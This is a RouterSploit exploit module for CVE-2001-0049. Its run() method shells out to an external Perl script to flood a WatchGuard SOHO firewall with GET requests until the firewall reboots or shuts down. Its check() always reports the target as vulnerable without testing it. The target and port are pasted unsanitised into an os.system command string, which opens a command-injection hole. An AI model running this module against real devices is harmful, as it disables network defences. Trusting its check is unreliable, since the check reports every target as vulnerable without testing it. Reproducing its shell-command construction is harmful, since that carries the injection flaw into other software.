import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2001-0049",

        "description": " A vulnerability exists in Watchguard SOHO 2.2 firewalls with firmware versions 2.2.1 and below that could  "
                       "allow a remote attacker to execute a Denial of Service attack on the firewall and render it in-operable. "
                       "It is possible for a remote attacker to issue large amounts of GET requests (70+) to the firewall which will  "
                       "in turn deplete memory resources on the firewall and either cause it to reboot or shutdown completely. In the case  "
                       "of a reboot, the firewall will be in-operable for one to five minutes. If the firewall shuts down completely, it will "
                       "require a power recycle. In the case of a sustained attack, the firewall can be permanently taken off-line. "
                       "It should be noted that this attack does not appear in the firewall logs except for a reboot notification.",

        "authors": (

            "Filip Maertens",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20487",

        ),

        "devices": (

            "watchguard, CVE-2001-0049"
        ),
    }

    target = OptIP(""," your watchguard ip")
    port = OptPort("", "watchguard port")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "perl exploit-db-20487.pl {} {}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True